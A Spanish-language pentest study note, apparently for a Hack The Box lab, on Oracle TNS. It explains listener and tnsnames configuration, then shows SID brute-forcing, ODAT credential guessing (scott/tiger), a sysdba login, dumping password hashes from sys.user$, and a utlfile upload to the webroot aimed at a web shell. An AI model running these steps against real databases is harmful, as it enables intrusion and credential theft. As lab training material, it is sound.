# Oracle TNS 

---

## 1) ¿Qué es Oracle TNS y por qué existe?

**Oracle Transparent Network Substrate (TNS)** es el **protocolo de comunicación** que permite que:

* **Clientes** (aplicaciones, herramientas, usuarios) se conecten a
* **Servicios Oracle** (principalmente **Oracle Database**, pero también otros componentes)
* **a través de la red**.

Pensalo como “el idioma” que hablan los clientes Oracle y los servicios Oracle para:

* descubrir a qué servicio conectarse,
* negociar parámetros de conexión,
* establecer la sesión,
* y transportar información (incluyendo consultas SQL) de manera confiable.


# Oracle Net Services

## 📌 ¿Qué es Oracle Net Services?

**Oracle Net Services** es la infraestructura de red de Oracle.

Es el sistema que permite que aplicaciones, herramientas y otros servicios se conecten a una base de datos Oracle a través de la red.

---

## 🧠 En términos simples

Oracle Net Services es:

> La capa que gestiona las conexiones hacia Oracle Database.

Incluye:

- El **listener**
- El protocolo **TNS**
- Resolución de nombres (`tnsnames.ora`)
- Configuración de red (`listener.ora`)
- Encriptación (SSL/TLS)
- Autenticación
- Manejo y control de sesiones

---

## 🔌 ¿Qué papel juega TNS?

TNS (Transparent Network Substrate) es el **protocolo** que usa Oracle Net Services para comunicarse.

Podemos pensarlo así:

- Oracle Net Services = infraestructura
- TNS = idioma que usa esa infraestructura

---

## 🏗 ¿Quién usa Oracle Net Services?

Muchos componentes pueden usarlo para conectarse a la base:

- Oracle Database (para exponer conexiones)
- Oracle Enterprise Manager
- Oracle Application Server
- Oracle Fusion Middleware
- Web servers (IIS, Apache)
- Aplicaciones empresariales

Pero estos **no son Oracle Net Services**.  
Son clientes que lo utilizan.

---

Sin Oracle Net Services, nadie podría conectarse remotamente a la base.

[Oracle Net Services](https://docs.oracle.com/en/database/oracle/oracle-database/18/netag/introducing-oracle-net-services.html)

### 1.1) ¿Por qué es importante en entornos enterprise?

Oracle se usa muchísimo en industrias con **bases grandes y críticas** (salud, finanzas, retail). Por eso, Oracle Net Services/TNS incorpora (o puede incorporar) características como:

* **Resolución de nombres** (mapeo de “nombre de servicio” a “host/puerto”).
* **Gestión de conexiones** (listener, instancias, servicios).
* **Balanceo** y tolerancia a fallos.
* **Seguridad** (incluyendo cifrado y SSL/TLS en versiones modernas).

> En pentesting, esto importa porque el “frente” típico del mundo Oracle en red suele ser el **listener TNS** (muy común en **TCP/1521**). Si está expuesto y mal configurado, puede filtrar información o permitir acceso.

---

## 2) Evolución y capacidades típicas

Con el tiempo, TNS se actualizó para soportar tecnologías más nuevas como:

* **IPv6**
* **SSL/TLS** (para cifrar la capa de transporte/negociación)

Y se usa para:

* **Name resolution** (resolver servicio → destino)
* **Connection management** (control de sesiones y forward al servicio correcto)
* **Load balancing**
* **Security** (cifrado, validación de certificados, etc.)

Además, Oracle provee capacidades para admins/devs:

* monitoreo y análisis de performance,
* reportes y logs,
* gestión de carga de trabajo,
* tolerancia a fallos con “database services”.

---

## 3) Configuración por defecto (lo que deberías esperar ver)

### 3.1) Puerto por defecto

El **listener TNS** típicamente escucha en:

* **TCP/1521**

> Ojo: puede cambiarse durante instalación o luego en config.

### 3.2) Protocolos y interfaces

Históricamente puede soportar distintos protocolos (además de TCP/IP). El listener también puede:

* escuchar en **varias interfaces**
* o en una IP específica / todas.

### 3.3) Gestión remota según versiones

* En **Oracle 8i/9i**: podía administrarse remotamente por defecto.
* En **Oracle 10g/11g**: no de la misma manera (más restringido por defecto).

### 3.4) Seguridad “por defecto” (y por qué igual es atacable)

Se menciona que puede incluir:

* aceptar conexiones de hosts autorizados,
* autenticación básica (hostnames/IP/user/pass),
* cifrado vía Oracle Net Services.

Pero en la práctica, en entornos reales aparecen:

* contraseñas débiles,
* cuentas default (según versión/servicio),
* servicios auxiliares expuestos,
* y configuraciones heredadas.

---

# Oracle TNS y su Ecosistema de Servicios

> En esta sección vamos a entender algo MUY importante: **Oracle TNS no vive solo**. Normalmente forma parte de un ecosistema de servicios Oracle que trabajan juntos.

La idea es que entiendas:

* Qué otros servicios suelen estar presentes.
* Qué contraseñas por defecto existieron históricamente.
* Por qué esto es relevante en un pentest.
* Cómo se relaciona todo con el archivo `tnsnames.ora`.

---

# 1️⃣ Oracle TNS junto a otros servicios Oracle

Oracle TNS suele utilizarse junto con varios componentes del ecosistema Oracle. Vamos uno por uno, explicado MUY simple:

---

## 🔹 Oracle Database

Es la base de datos en sí.

* Es donde viven las tablas, usuarios, datos financieros, médicos, etc.
* TNS permite que clientes se conecten a esta base.

👉 Sin Oracle Database, TNS no tendría nada a qué redirigir las conexiones.

---

## 🔹 Oracle DBSNMP

Es un servicio relacionado con monitoreo vía SNMP.

* Permite supervisar el estado de la base.
* Se usa para monitoreo automático.

⚠️ Históricamente usaba una contraseña por defecto:

```
dbsnmp
```

En pentesting, si vemos este servicio o usuario, es una credencial clásica para probar.

---

## 🔹 Oracle Application Server

Es un servidor de aplicaciones.

* Permite ejecutar aplicaciones web que usan la base Oracle.
* Muchas aplicaciones empresariales lo utilizan como backend.

Si comprometés esto, podés pivotear hacia la base.

---

## 🔹 Oracle Enterprise Manager

Es la consola de administración.

* Se usa para administrar bases Oracle.
* Permite ver rendimiento, usuarios, configuración.

Si está expuesto, puede ser un punto crítico de entrada.

---

## 🔹 Oracle Fusion Middleware

Es una plataforma intermedia para integrar aplicaciones.

* Une aplicaciones, servicios web y bases Oracle.
* Muy común en entornos corporativos grandes.

Si este componente tiene vulnerabilidades, puede dar acceso indirecto a la base.

---

## 🔹 Web Servers

Muchos entornos Oracle tienen servidores web (IIS, Apache, etc.) conectados a la base.

Ejemplo típico:

* Usuario accede a una web
* La web consulta Oracle
* Oracle responde

👉 Si comprometés Oracle, podés afectar la aplicación web.
👉 Si comprometés la web, podés intentar pivotear a Oracle.

---

# 2️⃣ Cambios históricos en contraseñas por defecto

Este punto es CLAVE en pentesting.

## 🔸 Oracle 9

Tenía contraseña por defecto:

```
CHANGE_ON_INSTALL
```

Muchos sistemas heredados la dejaron sin cambiar.

---

## 🔸 Oracle 10

Ya no tenía contraseña por defecto configurada automáticamente.

Pero eso no significa que el admin haya puesto una buena contraseña.

---

## 🔸 Oracle DBSNMP

Usuario típico:

```
dbsnmp
```

Contraseña por defecto histórica:

```
dbsnmp
```

En HTB y en entornos reales viejos, esto puede seguir funcionando.

---

# 3️⃣ Riesgo adicional: Servicio Finger

Algunas organizaciones usan el servicio:

```
finger
```

Finger permite consultar información sobre usuarios del sistema.

¿Por qué es peligroso?

Porque si sabés el directorio home de un usuario Oracle, podés:

* inferir rutas
* buscar archivos sensibles
* facilitar explotación

👉 Es un ejemplo clásico de cómo un servicio aparentemente “inofensivo” puede aumentar el riesgo.

---

# 4️⃣ Cómo encaja todo esto con tnsnames.ora

Cada base o servicio tiene una entrada única en el archivo:

```
tnsnames.ora
```
[Documentación](https://docs.oracle.com/cd/E11882_01/network.112/e10835/tnsnames.htm#NETRF007)

Este archivo contiene:

* Nombre del servicio (alias)
* Ubicación en red (host + puerto)
* Nombre real del servicio o base


## 4) Archivos clave: `tnsnames.ora` y `listener.ora`

Estos archivos suelen vivir en:

* `$ORACLE_HOME/network/admin`

### 4.1) `tnsnames.ora` (cliente-side)

Es el “diccionario” que usa el **cliente** para traducir un **nombre de servicio** a un **host/puerto** y parámetros de conexión.

Ejemplo dado:

```txt
ORCL =
  (DESCRIPTION =
    (ADDRESS_LIST =
      (ADDRESS = (PROTOCOL = TCP)(HOST = 10.129.11.102)(PORT = 1521))
    )
    (CONNECT_DATA =
      (SERVER = DEDICATED)
      (SERVICE_NAME = orcl)
    )
  )
```

**Lectura:**

* `ORCL =` → alias “humano” para referirse a este servicio.
* `(PROTOCOL = TCP)` → se conecta por TCP.
* `(HOST = 10.129.11.102)` → IP/hostname destino.
* `(PORT = 1521)` → puerto del listener.
* `(SERVER = DEDICATED)` → modo de servidor (dedicado vs shared).
* `(SERVICE_NAME = orcl)` → **nombre del servicio** que el cliente pide al conectarse.


# (SERVER = DEDICATED) vs (SERVER = SHARED)

## 📌 ¿Qué significa esta línea?

(SERVER = DEDICATED)

Le dice a Oracle cómo manejar la conexión del cliente a nivel interno.

No es seguridad.
No es cifrado.
No es red.

Es cómo Oracle asigna procesos para atender la conexión.

---

## 🧠 Modo DEDICATED (Servidor dedicado)

Cada conexión cliente recibe:

👉 Un proceso exclusivo en el servidor.

Es decir:

Cliente A → Proceso 1  
Cliente B → Proceso 2  
Cliente C → Proceso 3  

Cada usuario tiene su propio proceso de servidor.

### Ventajas:
- Mejor rendimiento por sesión
- Más simple
- Más estable
- Ideal para pocos usuarios o cargas pesadas

### Desventajas:
- Consume más memoria
- No escala bien con miles de usuarios

---

## 🧠 Modo SHARED (Servidor compartido)

Las conexiones no tienen un proceso exclusivo.

En su lugar:

👉 Varias conexiones comparten un pool de procesos.

Sería algo así:

Cliente A ┐  
Cliente B ├→ Pool de procesos compartidos  
Cliente C ┘  

Oracle usa un dispatcher que distribuye las solicitudes.

### Ventajas:
- Mucho más eficiente en memoria
- Escala mejor con muchos usuarios concurrentes

### Desventajas:
- Puede ser un poco más complejo
- Leve impacto en rendimiento por multiplexación

---

## 🎯 Diferencia mental clara

| DEDICATED | SHARED |
|-----------|--------|
| 1 proceso por usuario | Muchos usuarios comparten procesos |
| Más consumo de RAM | Más eficiente |
| Más simple | Más escalable |

---

## 🔥 ¿Esto importa en pentesting?

Normalmente no es un vector directo de ataque.

Pero sí puede darte pistas sobre:

- Arquitectura del sistema
- Tipo de carga
- Diseño empresarial

En entornos grandes (bancos, ERPs) es común ver SHARED.
En entornos simples o labs, casi siempre DEDICATED.

> El archivo puede tener **muchas entradas** (varias DBs/servicios). También puede incluir autenticación, pooling, balanceo, etc.

### 4.2) `listener.ora` (server-side)

Define cómo se comporta el **listener** (proceso del lado servidor):

* qué direcciones escucha,
* qué SIDs/servicios expone,
* parámetros, rutas, etc.

Ejemplo dado:

```txt
SID_LIST_LISTENER =
  (SID_LIST =
    (SID_DESC =
      (SID_NAME = PDB1)
      (ORACLE_HOME = C:\oracle\product\19.0.0\dbhome_1)
      (GLOBAL_DBNAME = PDB1)
      (SID_DIRECTORY_LIST =
        (SID_DIRECTORY =
          (DIRECTORY_TYPE = TNS_ADMIN)
          (DIRECTORY = C:\oracle\product\19.0.0\dbhome_1\network\admin)
        )
      )
    )
  )

LISTENER =
  (DESCRIPTION_LIST =
    (DESCRIPTION =
      (ADDRESS = (PROTOCOL = TCP)(HOST = orcl.inlanefreight.htb)(PORT = 1521))
      (ADDRESS = (PROTOCOL = IPC)(KEY = EXTPROC1521))
    )
  )

ADR_BASE_LISTENER = C:\oracle
```

**Qué te está diciendo esto:**

* Hay un SID/servicio descrito como `PDB1`.
* El Oracle Home está en `C:\oracle\product\19.0.0\dbhome_1` (esto sugiere Windows en el ejemplo).
* El listener escucha en:

  * TCP (HOST/PORT)
  * y también IPC con `EXTPROC1521` (uso local/procesos externos).
 
`IPC`: El listener puede comunicarse con procesos Oracle que corren en la misma máquina, sin usar TCP/IP.
IPC permite que:

Un proceso hable con otro proceso dentro del mismo sistema operativo sin pasar por la red. Es más rápido y más seguro que usar TCP cuando todo está en el mismo host.

`EXTPROC`: External Procedure.

`EXTPROC1521`: Es un mecanismo de Oracle que permite ejecutar código externo (por ejemplo C) desde `PL/SQL`.

Traducción: Además de escuchar en TCP 1521, también acepto conexiones internas vía IPC usando el canal EXTPROC1521.

`PL/SQL`: Procedural Language / SQL. Es el lenguaje propio de Oracle que extiende SQL.

PL/SQL permite:
- Variables
- IF / ELSE
- Bucles (LOOP, WHILE)
- Procedimientos
- Funciones
- Manejo de excepciones
- Paquetes

### 4.3) Resumen mental (muy importante)

* **Cliente**: usa `tnsnames.ora` para resolver “a dónde conecto y con qué nombre de servicio”.
* **Servidor**: usa `listener.ora` para saber “qué expongo y cómo escucho”.

---

## 5) Conceptos críticos: SERVICE_NAME vs SID (y por qué vas a bruteforcear)

En Oracle, un **SID** (*System Identifier*) identifica una **instancia** de base de datos.

* Una “base” puede tener **múltiples instancias**.
* Cada instancia es un conjunto de procesos/memoria que gestionan datos.

Cuando un cliente se conecta, suele indicar:

* el **SERVICIO** (`SERVICE_NAME`) y/o
* el **SID** (según configuración),

para decir “quiero entrar a **esta** instancia/servicio”.

> Si le errás al SID/servicio, la conexión falla. Por eso, una etapa típica de enumeración es **adivinar (guess) SIDs**.

Herramientas típicas para esto:

* `nmap` (scripts NSE)
* `hydra` (en escenarios específicos)
* `odat` (múltiples módulos)

---

## 6) Hardening extra: PL/SQL Exclusion List

Oracle puede usar una **PL/SQL Exclusion List** (`PlsqlExclusionList`):

* es un archivo de texto creado por el usuario,
* se coloca en `$ORACLE_HOME/sqldeveloper`,
* lista paquetes/tipos PL/SQL que se deben **bloquear**.

Funciona como una **blacklist**: esos componentes no se pueden ejecutar (por ejemplo, vía Oracle Application Server).

> En pentest: si está bien aplicada, puede frustrar ciertos vectores que dependen de paquetes PL/SQL peligrosos.

---

## 7) Parámetros comunes en `tnsnames.ora` / conexión (tabla explicada)

A continuación, los campos del contenido y qué significan **en la práctica**:


| Parámetro | Qué es técnicamente | Qué significa en la práctica | Qué mirar como pentester |
|------------|--------------------|-----------------------------|---------------------------|
| DESCRIPTION | Bloque contenedor de configuración | Es el “sobre” que agrupa todos los parámetros de conexión | No es sensible por sí mismo, pero contiene todo lo importante |
| ADDRESS | Dirección de red del servicio | Define a qué servidor se conecta el cliente | Puede revelar IPs internas o nombres DNS internos |
| PROTOCOL | Protocolo de comunicación | TCP, IPC, TCPS (TLS), etc. | Si es TCPS, revisar configuración SSL/TLS |
| PORT | Puerto de escucha | Normalmente 1521 por defecto | Puerto no estándar puede indicar hardening o intento de ocultación |
| CONNECT_DATA | Datos que identifican el destino | Indica qué servicio/SID se quiere usar | Punto clave para enumeración de SID y servicios |
| INSTANCE_NAME | Nombre específico de la instancia | Identifica una instancia concreta dentro del servidor Oracle | Útil para enumeración avanzada y movimiento lateral |
| SERVICE_NAME | Nombre lógico del servicio | Es el nombre que el cliente solicita al conectarse | Puede revelar arquitectura interna |
| SERVER | Tipo de manejo de conexión | DEDICATED o SHARED | Da pistas sobre arquitectura y carga del sistema |
| USER | Usuario de conexión | Usuario de base de datos | Puede estar hardcodeado en configs expuestas |
| PASSWORD | Contraseña de conexión | Password del usuario | Hallazgo crítico si aparece en texto plano |
| SECURITY | Configuración de seguridad | Define cifrado/autenticación | Ver si hay cifrado obligatorio o mal configurado |
| VALIDATE_CERT | Validación del certificado TLS | Indica si se valida el certificado del servidor | Si está deshabilitado → posible MITM |
| SSL_VERSION | Versión de SSL/TLS | TLS 1.2, 1.3, etc. | Versiones antiguas → downgrade attack |
| CONNECT_TIMEOUT | Tiempo máximo para conectar | Controla cuánto espera antes de abortar | No es vector directo, pero afecta testing |
| RECEIVE_TIMEOUT | Tiempo máximo esperando respuesta | Controla latencia aceptable | Puede afectar ataques de timing |
| SEND_TIMEOUT | Tiempo máximo para enviar datos | Similar a arriba | No suele ser vector directo |
| SQLNET.EXPIRE_TIME | Keepalive de conexión | Detecta conexiones caídas | Bajo valor puede afectar sesiones largas |
| TRACE_LEVEL | Nivel de trazas | Nivel de logging detallado | Si está alto, puede dejar rastros de ataque |
| TRACE_DIRECTORY | Directorio de logs de traza | Donde se guardan archivos de debugging | Puede contener información sensible |
| TRACE_FILE_NAME | Nombre del archivo de traza | Archivo donde se guarda la traza | Buscar exposición si hay acceso al sistema |
| LOG_FILE | Archivo de log general | Registro de eventos del listener/conexión | Fuente de evidencia o info sensible |

> Como pentester, cuando veas settings de TLS/validación de cert, pensá: ¿está bien configurado o hay downgrade/malas prácticas?

---

## 8) Preparación de herramientas en Pwnbox (setup)

Antes de enumerar/interactuar, el material sugiere instalar dependencias y ODAT.

Comandos:

```bash
apt update -y
apt install odat -y
```

## 9) Verificación: ODAT funciona


```bash
odat -h
```

Output:

```txt
usage: odat [-h] [--version]
               {all,tnscmd,tnspoison,sidguesser,snguesser,passwordguesser,utlhttp,httpuritype,utltcp,ctxsys,externaltable,dbmsxslprocessor,dbmsadvisor,utlfile,dbmsscheduler,java,passwordstealer,oradbg,dbmslob,stealremotepwds,userlikepwd,smb,privesc,cve,search,unwrapper,clean}
               ...

            _  __   _  ___
           / \|  \ / \|_ _|
          ( o ) o ) o || |
           \_/|__/|_n_||_|
-------------------------------------------
  _        __           _           ___
 / \      |  \         / \         |_ _|
( o )       o )         o |         | |
 \_/racle |__/atabase |_n_|ttacking |_|
-------------------------------------------

By Quentin Hardy (quentin.hardy@protonmail.com or quentin.hardy@bt.com)
...SNIP...
```

**Qué es ODAT:**

`Oracle Database Attacking Tool`:

* Herramienta open-source en Python para **enumerar y explotar** problemas en Oracle.
* Puede ayudar a identificar:

  * nombres/versiones,
  * usuarios,
  * credenciales débiles,
  * misconfigs,
  * y rutas de abuso (file upload, ejecuciones, etc.).

---

## 10) Detección inicial con Nmap (¿está el listener expuesto?)

Escaneo al puerto default:

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open
```

Output:

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 10:59 EST
Nmap scan report for 10.129.204.235
Host is up (0.0041s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.64 seconds
```

### 10.1) Cómo interpretar “unauthorized”

Significa que Nmap identifica el listener y versión, pero **no está autenticado** para obtener info adicional o interactuar a cierto nivel.

Igual, ya tenés 3 datos valiosos:

* el puerto está abierto,
* hay un servicio Oracle TNS,
* y una versión aproximada (11.2.0.2.0 en el ejemplo).

---



## 11) Enumeración de SID con Nmap (bruteforce)

# 📌 Oracle SID (System Identifier) — Concepto y Enumeración

## 🔎 Puerto abierto y servicio activo

Si durante el escaneo observamos que el puerto **1521/TCP** está abierto y el servicio `oracle-tns` está corriendo, significa que el **listener Oracle** está activo y aceptando conexiones.

Esto nos lleva a un concepto clave en Oracle:

---

# 🧠 ¿Qué es un SID?

**SID (System Identifier)** es el nombre único que identifica una instancia específica de una base de datos Oracle.

Importante:

- Una base Oracle puede tener **múltiples instancias**.
- Cada instancia tiene su propio **SID**.
- Una instancia es el conjunto de:
  - Procesos
  - Estructuras de memoria
  - Recursos internos

Que trabajan juntos para gestionar los datos de la base.

---

# 🔌 ¿Cómo se usa el SID en una conexión?

Cuando un cliente se conecta a Oracle, debe indicar:

- IP o hostname
- Puerto
- Y el **SID** (o SERVICE_NAME)

Script NSE:

```bash
sudo nmap -p1521 -sV 10.129.204.235 --open --script oracle-sid-brute
```

Output:

```txt
Starting Nmap 7.93 ( https://nmap.org ) at 2023-03-06 11:01 EST
Nmap scan report for 10.129.204.235
Host is up (0.0044s latency).

PORT     STATE SERVICE    VERSION
1521/tcp open  oracle-tns Oracle TNS listener 11.2.0.2.0 (unauthorized)
| oracle-sid-brute:
|_  XE

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 55.40 seconds
```

### 11.1) ¿Qué significa que encontró `XE`?

`XE` suele asociarse a **Oracle Express Edition**.

En este caso, te está diciendo: “hay una instancia/servicio que responde al SID `XE`”.

> En HTB es muy común ver `XE` porque es una versión ligera y fácil de desplegar en labs.

---

## 12) Enumeración avanzada con ODAT

# 📌 Enumeración con ODAT (Oracle Database Attacking Tool)

`Odat` permite realizar distintos tipos de análisis sobre una base de datos Oracle para obtener información como:

- 📛 Nombres de bases de datos
- 🔢 Versiones del servidor
- ⚙ Procesos en ejecución
- 👤 Cuentas de usuario
- 🔐 Credenciales débiles
- 🛠 Vulnerabilidades conocidas
- ⚠ Configuraciones inseguras

Ejecutar todos los módulos (modo “all”):

```bash
odat all -s 10.129.204.235
```

Output relevante:

```txt
[+] Checking if target 10.129.204.235:1521 is well configured for a connection...
[+] According to a test, the TNS listener 10.129.204.235:1521 is well configured. Continue...

...SNIP...

[!] Notice: 'mdsys' account is locked, so skipping this username for password           #####################| ETA:  00:01:16
[!] Notice: 'oracle_ocm' account is locked, so skipping this username for password       #####################| ETA:  00:01:05
[!] Notice: 'outln' account is locked, so skipping this username for password           #####################| ETA:  00:00:59
[+] Valid credentials found: scott/tiger. Continue...

...SNIP...
```

### 12.1) Qué pasó acá

* ODAT probó conectividad/config.
* Luego ejecutó módulos que incluyen **password guessing**.
* Detectó cuentas **locked** (bloqueadas), las saltea.
* Y encontró credenciales válidas:

✅ `scott / tiger`

> `scott/tiger` es una combinación clásica de ejemplo/demo en Oracle. En entornos reales puede aparecer por mala higiene o sistemas heredados.

---

## 13) Acceso con `sqlplus` (login real a la DB)

`Instalación`:
```bash
apt install oracle-instantclient-sqlplus
```

Conectás así:

```bash
sqlplus scott/tiger@10.129.204.235/XE
```

Output:

```txt
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:19:21 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.

ERROR:
ORA-28002: the password will expire within 7 days



Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production

SQL>
```


### 13.1) Interpretación del mensaje ORA-28002

No te bloquea el acceso: te avisa que **la contraseña expira pronto**.

### 13.2) Sobre las versiones (detalle que confunde a muchos)

* `SQL*Plus` es la herramienta cliente (acá Release 21.x).
* La base puede ser otra versión (acá **Oracle Database 11g XE 11.2.0.2.0**).

Es normal que el **cliente** sea más nuevo que el **servidor**.

### 13.3) Error común: librerías compartidas

Si aparece:

`sqlplus: error while loading shared libraries: libsqlplus.so: cannot open shared object file: No such file or directory`

Solución sugerida:

```bash
sudo sh -c "echo /usr/lib/oracle/12.2/client64/lib > /etc/ld.so.conf.d/oracle-instantclient.conf";sudo ldconfig
```

**Qué hace esto:** agrega la ruta del Instant Client a `ld.so` para que el loader encuentre `libsqlplus.so`.

El comando está sacado de [aquí](https://stackoverflow.com/questions/27717312/sqlplus-error-while-loading-shared-libraries-libsqlplus-so-cannot-open-shared).


---

## 14) Enumeración manual dentro de SQL*Plus

### 14.1) Listar tablas disponibles

Existen muchos [comandos SQLplus](https://docs.oracle.com/cd/E11882_01/server.112/e41085/sqlqraa001.htm#SQLQR985) que podemos usar para enumerar la base de datos manualmente. Por ejemplo, podemos listar todas las tablas disponibles en la base de datos actual o mostrar los privilegios del usuario actual, como se muestra a continuación:

```sql
select table_name from all_tables;
```

Output:

```txt
TABLE_NAME
------------------------------
DUAL
SYSTEM_PRIVILEGE_MAP
TABLE_PRIVILEGE_MAP
STMT_AUDIT_OPTION_MAP
AUDIT_ACTIONS
WRR$_REPLAY_CALL_FILTER
HS_BULKLOAD_VIEW_OBJ
HS$_PARALLEL_METADATA
HS_PARTITION_COL_NAME
HS_PARTITION_COL_TYPE
HELP

...SNIP...
```

**Qué es esto:**

* `all_tables` es una vista que muestra tablas accesibles (dependiendo de permisos).
* Ver tablas de auditoría/privilegios ya te da pistas del “mundo Oracle” que hay detrás.

### 14.2) Ver roles asignados al usuario actual

```sql
select * from user_role_privs;
```

Output:

```txt
USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SCOTT                          CONNECT                        NO  YES NO
SCOTT                          RESOURCE                       NO  YES NO
```

**Interpretación:**

* `SCOTT` tiene roles típicos para trabajar (CONNECT/RESOURCE).
* No parece admin.

---

## 15) Intento de escalar: conectar “as sysdba”

El material muestra que se puede intentar:

```bash
sqlplus scott/tiger@10.129.204.235/XE as sysdba
```

Output:

```txt
SQL*Plus: Release 21.0.0.0.0 - Production on Mon Mar 6 11:32:58 2023
Version 21.4.0.0.0

Copyright (c) 1982, 2021, Oracle. All rights reserved.


Connected to:
Oracle Database 11g Express Edition Release 11.2.0.2.0 - 64bit Production


SQL> select * from user_role_privs;

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            ADM_PARALLEL_EXECUTE_TASK      YES YES NO
SYS                            APEX_ADMINISTRATOR_ROLE        YES YES NO
SYS                            AQ_ADMINISTRATOR_ROLE          YES YES NO
SYS                            AQ_USER_ROLE                   YES YES NO
SYS                            AUTHENTICATEDUSER              YES YES NO
SYS                            CONNECT                        YES YES NO
SYS                            CTXAPP                         YES YES NO
SYS                            DATAPUMP_EXP_FULL_DATABASE     YES YES NO
SYS                            DATAPUMP_IMP_FULL_DATABASE     YES YES NO
SYS                            DBA                            YES YES NO
SYS                            DBFS_ROLE                      YES YES NO

USERNAME                       GRANTED_ROLE                   ADM DEF OS_
------------------------------ ------------------------------ --- --- ---
SYS                            DELETE_CATALOG_ROLE            YES YES NO
SYS                            EXECUTE_CATALOG_ROLE           YES YES NO
...SNIP...
```

### 15.1) ¿Qué implica esto?

* Entraste como **SYS** con privilegios altísimos (`DBA`, roles de catálogo, etc.).

**¿Cómo puede pasar?**

* Porque el usuario y el entorno tienen permisos/configuración que lo permiten.
* En real life depende muchísimo del setup (y suele ser un hallazgo crítico si se logra).

> Si podés hacer `as sysdba`, tu superficie de acción se amplía enormemente.

---

## 16) Post-explotación: extraer hashes de contraseñas

Una acción clásica (para cracking offline) es consultar `sys.user$`:

```sql
select name, password from sys.user$;
```

Output:

```txt
NAME                           PASSWORD
------------------------------ ------------------------------
SYS                            FBA343E7D6C8BC9D
PUBLIC
CONNECT
RESOURCE
DBA
SYSTEM                         B5073FE1DE351687
SELECT_CATALOG_ROLE
EXECUTE_CATALOG_ROLE
DELETE_CATALOG_ROLE
OUTLN                          4A3BA55E08595C81
EXP_FULL_DATABASE

NAME                           PASSWORD
------------------------------ ------------------------------
IMP_FULL_DATABASE
LOGSTDBY_ADMINISTRATOR
...SNIP...
```

### 16.1) Qué es esto

* Estás obteniendo **hashes/representaciones** de password en el catálogo.
* Luego podrías intentar cracking con herramientas offline (dependiendo del formato/versión).

> Nota: el material aclara que “no podemos agregar usuarios o modificar”. Eso depende del lab/limitaciones. En un entorno real, con SYS normalmente podrías hacer muchísimo más.

---

## 17) Vector alternativo: upload de archivos (y posible web shell)

Si el servidor tiene un web server y conocés el **document root**, podrías **subir un archivo** y luego pedirlo por HTTP.

Rutas default típicas:

* Linux: `/var/www/html`
* Windows: `C:\inetpub\wwwroot`

> La idea táctica: primero subir algo inocuo (para evitar AV/IDS), validar, y recién después pensar en payloads.

### 17.1) Crear un archivo de prueba

```bash
echo "Oracle File Upload Test" > testing.txt
```

### 17.2) Subirlo con ODAT (`utlfile`)

Comando:

```bash
odat utlfile -s 10.129.204.235 -d XE -U scott -P tiger --sysdba --putFile C:\\inetpub\\wwwroot testing.txt ./testing.txt
```

Output:

```txt
[1] (10.129.204.235:1521): Put the ./testing.txt local file in the C:\inetpub\wwwroot folder like testing.txt on the 10.129.204.235 server                                                                                                  
[+] The ./testing.txt file was created on the C:\inetpub\wwwroot directory on the 10.129.204.235 server like the testing.txt file
```

### 17.3) Validar desde HTTP con curl

```bash
curl -X GET http://10.129.204.235/testing.txt
```

Output:

```txt
Oracle File Upload Test
```

**Qué demuestra esto:**

* Lograste escribir en el webroot.
* El webserver sirve el archivo.

En un pentest, esto suele escalar a:

* subir un archivo con contenido activo (según tecnología del server),
* o usarlo como punto de apoyo para más acceso.

---

## 18) Checklist mental de enumeración Oracle TNS

1. **Descubrir** el listener (por defecto 1521) con `nmap -sV`.
2. **Identificar** versión aproximada (te guía sobre defaults y exploits).
3. **Enumerar SID/SERVICE_NAME** (ej: `oracle-sid-brute`).
4. **Probar ODAT** (`all` o módulos específicos) para:

   * descubrir credenciales,
   * detectar cuentas locked,
   * mapear superficie.
5. **Conectar** con `sqlplus` y enumerar:

   * tablas/vistas,
   * roles/privilegios,
   * información de instancia.
6. Si hay camino a privilegios altos (como `sysdba`), evaluar:

   * extracción de hashes,
   * lectura de info sensible,
   * abusos como `utlfile` (upload), etc.
7. **Validar impacto** (ej: upload en webroot + `curl`).

---


# Preguntas

#### Enumere la base de datos Oracle de destino y envíe el hash de contraseña del usuario DBSNMP como respuesta.


Lanzamos una traza `ICMP` para verificar que el host se encuentra activo:
<img width="924" height="259" alt="image" src="https://github.com/user-attachments/assets/ec47a37a-b25e-4f92-9a06-253ecc16dfa1" />

Realizamos un escaneo `TCP SYN` con nmap para verificar que el puerto `1521` está abierto:

```bash
nmap -Pn -n --reason -sS -p1521 <ip>
```
<img width="981" height="307" alt="image" src="https://github.com/user-attachments/assets/1d06fc32-b839-4e61-ab31-921d03750859" />


Ya sabemos que el listener está expuesto, ahora realizamos un escaneo de versiones con nmap:
```bash
nmap -Pn -n --reason -sV -p1521 <ip> --open
```

<img width="1338" height="224" alt="image" src="https://github.com/user-attachments/assets/6a6c0664-f11a-4581-9859-552bac9442f7" />  

Antes de utilizar el script NSE nmap del material, procedemos a listar todos los scripts NSE que posee nmap con el siguiente comando:
```bash
find / -type f -name oracle* 2>/dev/null |grep scripts
```
<img width="1028" height="277" alt="image" src="https://github.com/user-attachments/assets/baead7c0-737b-43c8-8d55-6fc8b8ca00ed" />  

`Nota`: Este comando es útil porque también encontró scripts de metasploit.

Ahora procedemos a realizar el script NSE de nmap `oracle-sid-brute`:
```bash
nmap -p1521 -sV 10.129.205.19 --open --script oracle-sid-brute
```
<img width="1105" height="597" alt="image" src="https://github.com/user-attachments/assets/d95e9e79-2ad9-40e2-8385-3f1bbad170bb" />


Paralelamente podríamos haber utilizado los scripts de `Metasploit` o buscar scanners:

<img width="1914" height="906" alt="image" src="https://github.com/user-attachments/assets/e9c02b33-9918-4c81-9873-15764bd71f95" />

Intentamos utilizar el scanner `auxiliary/scanner/oracle/sid_enum` pero obtenemos como respuesta que el host está protegido:
<img width="1829" height="512" alt="image" src="https://github.com/user-attachments/assets/e802cf82-26d7-4a5b-9afe-16218855fb66" />  


